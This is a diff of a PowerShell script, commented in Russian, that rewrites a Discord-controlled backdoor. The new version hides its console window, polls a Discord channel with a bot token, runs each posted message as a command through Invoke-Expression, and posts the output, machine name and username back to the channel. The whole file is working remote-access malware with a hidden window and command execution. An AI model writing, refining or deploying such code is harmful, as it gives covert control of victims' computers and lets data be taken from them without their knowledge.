@@ -1,104 +1,122 @@
-$token = "$tk"
-$chan = "$ch"
-$response = ""
-$previouscmd = ""
-$authenticated = 0
+$token = "$tk"      # берётся из bat-файла
+$chan  = "$ch"      # берётся из bat-файла
 
-function PullMsg {
-    $headers = @{ 'Authorization' = "Bot $token" }
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", $headers.Authorization)
-    $result = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
-    if ($result) {
-        $most_recent_message = ($result | ConvertFrom-Json)[0]
-        if (-not $most_recent_message.author.bot) {
-            $script:response = $most_recent_message.content
-        }
+# ===================== СКРЫТИЕ КОНСОЛИ =====================
+$t = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+Add-Type -MemberDefinition $t -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru | Out-Null
+$p = Get-Process -Id $PID
+if ($p.MainWindowHandle -ne 0) { [Win32Functions.Win32ShowWindowAsync]::ShowWindowAsync($p.MainWindowHandle, 0) | Out-Null }
+
+# ===================== БЕЗОПАСНАЯ ОТПРАВКА СООБЩЕНИЯ =====================
+function Send-DiscordMessage {
+    param([string]$Content = " ")
+
+    # Убираем нулевые байты и экранируем обратные кавычки (главная причина 400 Bad Request)
+    $Content = $Content -replace "`0", "" -replace "`", "ˋ"
+
+    $uri = "https://discord.com/api/v9/channels/$chan/messages"
+    $boundary = [guid]::NewGuid().ToString()
+    $LF = "`r`n"
+
+    $bodyLines = @()
+    $bodyLines += "--$boundary"
+    $bodyLines += 'Content-Disposition: form-data; name="payload_json"'
+    $bodyLines += ""
+    $bodyLines += (@{ content = $Content } | ConvertTo-Json -Compress)
+    $bodyLines += "--$boundary--"
+    $body = [byte[]][char[]]($bodyLines -join $LF)
+
+    $headers = @{
+        "Authorization" = "Bot $token"
+        "Content-Type"  = "multipart/form-data; boundary=$boundary"
     }
-}
 
-function sendMsg {
-    param([string]$Message)
-    $dir = $PWD.Path
-    $url = "https://discord.com/api/v9/channels/$chan/messages"
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", "Bot $token")
-    if ($Message) {
-        $jsonBody = @{
-            "content" = "$Message"
-            "username" = "$dir"
-        } | ConvertTo-Json
-        $webClient.Headers.Add("Content-Type", "application/json")
+    try {
+        Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -TimeoutSec 10 -ErrorAction Stop | Out-Null
+    } catch {
+        # fallback на случай совсем проблемного контента
         try {
-            $response = $webClient.UploadString($url, "POST", $jsonBody)
-            Write-Host "Message sent to Discord"
-        } catch {
-            Write-Warning "Failed to send message: $_"
-        }
+            $payload = @{ content = "Ошибка отправки (слишком большой/запрещённые символы)" } | ConvertTo-Json -Compress
+            $simple = [byte[]][char[]]("--$boundary$LFContent-Disposition: form-data; name=`"payload_json`"$LF$LF$payload$LF--$boundary--")
+            Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $simple | Out-Null
+        } catch {}
     }
 }
 
-Function Authenticate{
-    if ($response -like "$env:COMPUTERNAME"){
-        $script:authenticated = 1
-        $script:previouscmd = $response
-        sendMsg ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
-        sendMsg "``PS | $dir>``"
-    } else {
-        $script:authenticated = 0
-        $script:previouscmd = $response
-    } 
+# ===================== ПОЛУЧЕНИЕ ПОСЛЕДНЕГО СООБЩЕНИЯ =====================
+function Get-LastMessage {
+    $headers = @{ "Authorization" = "Bot $token" }
+    try {
+        $msgs = Invoke-RestMethod -Uri "https://discord.com/api/v9/channels/$chan/messages?limit=1" -Headers $headers -TimeoutSec 10
+        if ($msgs -and $msgs[0].author.bot -eq $false) {
+            return $msgs[0].content.Trim()
+        }
+    } catch {}
+    return $null
 }
 
-# MAIN LOOP
-PullMsg
-$previouscmd = $response
-sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
+# ===================== СТАРТ =====================
+$authenticated = $false
+$lastCmd = ""
+
+Send-DiscordMessage -Content ":hourglass_flowing_sand: **$env:COMPUTERNAME** | `$env:USERNAME` | Session Waiting..."
 
 while ($true) {
-    PullMsg
-    if ($response -ne $previouscmd) {
-        $dir = $PWD.Path
-        Write-Host "Command found!"
-        if ($authenticated -eq 1) {
-            if ($response -eq "close") {
-                $previouscmd = $response        
-                sendMsg ":octagonal_sign:  **$env:COMPUTERNAME** | ``Session Closed.``  :octagonal_sign:"
-                break
-            }
-            if ($response -eq "Pause") {
-                $script:authenticated = 0
-                $previouscmd = $response
-                sendMsg ":pause_button:  **$env:COMPUTERNAME** | ``Session Paused..``  :pause_button:"
-                Start-Sleep -Milliseconds 250
-                sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
-            }
-            else {
-                # Универсально: если команда начинается с двух или более слов — запускать через cmd /c, иначе через PowerShell
-                if ($response -match '^(ipconfig|ping|date|whoami|dir|echo)') {
-                    $Result = cmd /c $response 2>&1
-                } else {
-                    $Result = try { iex($response) 2>&1 } catch { $_ }
-                }
-                $script:previouscmd = $response
-                $output = ($Result | Out-String).Trim()
-                if ($output -ne "") {
-                    $maxBatchSize = 1900
-                    $total = $output.Length
-                    for ($i=0; $i -lt $total; $i+=$maxBatchSize) {
-                        $chunk = $output.Substring($i, [Math]::Min($maxBatchSize, $total - $i))
-                        sendMsg "``````"
-                        Start-Sleep -Milliseconds 250
-                    }
-                } else {
-                    sendMsg ":white_check_mark:  ``Command Sent``  :white_check_mark:"
-                }
-                sendMsg "``PS | $dir>``"
-            }
-        } else {
-            Authenticate
-        }
-    }
-    Start-Sleep -Seconds 5
-}
+    Start-Sleep -Seconds 4
+    $cmd = Get-LastMessage
 
+    if ($cmd -and $cmd -ne $lastCmd) {
+        $lastCmd = $cmd
+        $dir = (Get-Location).Path
+
+        # Авторизация по имени компьютера (как было у тебя изначально)
+        if (-not $authenticated) {
+            if ($cmd -eq $env:COMPUTERNAME) {
+                $authenticated = $true
+                Send-DiscordMessage -Content ":white_check_mark: **$env:COMPUTERNAME** | Session Started!"
+                Send-DiscordMessage -Content "``PS $dir>``"
+                continue
+            } else {
+                continue
+            }
+        }
+
+        # Управление сессией
+        if ($cmd -match "^(close|exit)$") {
+            Send-DiscordMessage -Content ":octagonal_sign: Session Closed."
+            break
+        }
+        if ($cmd -eq "pause") {
+            $authenticated = $false
+            Send-DiscordMessage -Content ":pause_button: Session Paused."
+            continue
+        }
+
+        # Выполнение команды
+        try {
+            $output = Invoke-Expression $cmd 2>&1 | Out-String
+        } catch {
+            $output = "Ошибка: $($_.Exception.Message)"
+        }
+        if (-not $output) { $output = "(нет вывода)" }
+
+        # Разбиваем длинный вывод на куски по ~1900 символов
+        $chunks = @()
+        $current = ""
+        foreach ($line in ($output -split "`n")) {
+            if (($current + $line + "`n").Length -gt 1900) {
+                $chunks += $current.TrimEnd()
+                $current = ""
+            }
+            $current += $line + "`n"
+        }
+        if ($current) { $chunks += $current.TrimEnd() }
+
+        foreach ($chunk in $chunks) {
+            Send-DiscordMessage -Content "``````$chunk``````"
+            Start-Sleep -Milliseconds 400
+        }
+
+        Send-DiscordMessage -Content "``PS $dir>``"
+    }
+}
